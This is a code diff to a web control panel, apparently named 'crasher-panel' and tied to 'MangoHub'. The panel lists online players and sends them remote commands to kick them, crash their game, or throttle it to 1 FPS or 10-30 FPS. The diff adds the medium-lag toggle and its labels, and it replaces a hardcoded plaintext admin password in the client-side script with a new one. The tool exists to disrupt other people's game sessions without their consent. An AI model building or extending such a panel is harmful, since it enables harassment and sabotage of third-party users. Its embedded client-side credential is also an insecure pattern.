@@ -31,6 +31,8 @@
             --green: #2ecc71;
             --green-dim: rgba(46, 204, 113, 0.1);
             --amber: #f39c12;
+            --blue: #3498db;
+            --blue-dim: rgba(52, 152, 219, 0.1);
             --radius: 10px;
             --radius-sm: 6px;
             --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -57,7 +59,6 @@
             border-radius: 4px;
         }
 
-        /* === LOGIN === */
         .login-overlay {
             position: fixed;
             inset: 0;
@@ -140,7 +141,6 @@
             min-height: 18px;
         }
 
-        /* === MAIN === */
         .main-panel {
             display: none;
             padding: 24px 20px;
@@ -151,7 +151,6 @@
             display: block;
         }
 
-        /* === HEADER === */
         .header {
             display: flex;
             align-items: center;
@@ -212,7 +211,6 @@
             font-weight: 600;
         }
 
-        /* === GRID === */
         .grid {
             display: grid;
             grid-template-columns: 1fr 340px;
@@ -224,7 +222,6 @@
             }
         }
 
-        /* === PLAYERS === */
         .players-section {
             background: var(--bg-card);
             border: 1px solid var(--border);
@@ -315,7 +312,6 @@
             font-size: 14px;
         }
 
-        /* === COMMANDS === */
         .commands-section {
             background: var(--bg-card);
             border: 1px solid var(--border);
@@ -346,7 +342,6 @@
             display: block;
         }
 
-        /* Toggle */
         .toggle {
             display: flex;
             align-items: center;
@@ -379,7 +374,6 @@
             color: var(--accent);
         }
 
-        /* Buttons */
         .btn-group {
             display: flex;
             gap: 8px;
@@ -427,12 +421,19 @@
             background: var(--green-dim);
             border-color: var(--green);
         }
+        .btn-info {
+            color: var(--blue);
+            border-color: rgba(52, 152, 219, 0.2);
+        }
+        .btn-info:hover {
+            background: var(--blue-dim);
+            border-color: var(--blue);
+        }
         .btn-danger.active {
             background: var(--red-dim);
             border-color: var(--red);
         }
 
-        /* === TOAST === */
         .toast {
             position: fixed;
             bottom: 24px;
@@ -454,7 +455,6 @@
             transform: translateX(-50%) translateY(0);
         }
 
-        /* === RESPONSIVE === */
         @media (max-width: 480px) {
             .header {
                 flex-direction: column;
@@ -521,8 +521,12 @@
             <div class="cmd-group">
                 <span class="cmd-label">Performance</span>
                 <div class="toggle" id="toggleLag">
-                    <span class="label">Limit to 1 FPS</span>
+                    <span class="label">1 FPS (Heavy)</span>
                     <span class="status" id="lagStatus">OFF</span>
+                </div>
+                <div class="toggle" id="toggleMidLag" style="margin-top:6px;">
+                    <span class="label">10-30 FPS (Medium)</span>
+                    <span class="status" id="midLagStatus">OFF</span>
                 </div>
             </div>
 
@@ -543,7 +547,7 @@
 <script>
     // === CONFIG ===
     const SERVER_URL = "https://crasher-panel.onrender.com";
-    const ADMIN_PASSWORD = "admin123";
+    const ADMIN_PASSWORD = "MangoHubPanel67";
 
     let currentTarget = null;
     let authToken = "";
@@ -601,12 +605,19 @@
 
                 let status = '';
                 if (p.crashActive) status = 'crash';
-                else if (p.lagActive) status = 'lag';
+                else if (p.lagActive) status = '1fps';
+                else if (p.midLagActive) status = 'mid';
+
+                const statusLabels = {
+                    'crash': 'crash',
+                    '1fps': '1fps',
+                    'mid': 'mid'
+                };
 
                 card.innerHTML = `
                     <div class="player-avatar">${p.username.charAt(0).toUpperCase()}</div>
                     <div class="player-name">${p.username}</div>
-                    <div class="player-status ${status ? 'active' : ''}">${status || 'online'}</div>
+                    <div class="player-status ${status ? 'active' : ''}">${statusLabels[status] || 'online'}</div>
                 `;
                 card.addEventListener('click', () => selectPlayer(p.username));
                 grid.appendChild(card);
@@ -630,10 +641,17 @@
 
         const p = playersData[username];
         if (p) {
-            const toggle = $('#toggleLag');
-            toggle.classList.toggle('active', p.lagActive || false);
+            // Lag toggle
+            const lagToggle = $('#toggleLag');
+            lagToggle.classList.toggle('active', p.lagActive || false);
             $('#lagStatus').textContent = p.lagActive ? 'ON' : 'OFF';
 
+            // Mid Lag toggle
+            const midToggle = $('#toggleMidLag');
+            midToggle.classList.toggle('active', p.midLagActive || false);
+            $('#midLagStatus').textContent = p.midLagActive ? 'ON' : 'OFF';
+
+            // Crash buttons
             const crashBtn = $('#btnCrash');
             const stopBtn = $('#btnStopCrash');
             if (p.crashActive) {
@@ -665,7 +683,12 @@
             });
 
             if (res.ok) {
-                const names = { kick: 'Kick', crash: 'Crash', lag: 'FPS limit' };
+                const names = {
+                    kick: 'Kick',
+                    crash: 'Crash',
+                    lag: '1 FPS',
+                    midlag: '10-30 FPS'
+                };
                 const msg = value === false ? `Disabled ${names[command] || command}` : `${names[command] || command} sent`;
                 showToast(`${msg} → ${currentTarget}`);
             } else {
@@ -682,6 +705,13 @@
         this.classList.toggle('active', active);
         $('#lagStatus').textContent = active ? 'ON' : 'OFF';
         sendCommand('lag', active);
+    });
+
+    $('#toggleMidLag').addEventListener('click', function () {
+        const active = !this.classList.contains('active');
+        this.classList.toggle('active', active);
+        $('#midLagStatus').textContent = active ? 'ON' : 'OFF';
+        sendCommand('midlag', active);
     });
 
     $('#btnKick').addEventListener('click', () => sendCommand('kick'));
@@ -718,7 +748,6 @@
         setInterval(updatePlayers, 3000);
     }
 
-    // Enter to login
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Enter' && $('#keyInput').value) {
             $('#loginForm').dispatchEvent(new Event('submit'));
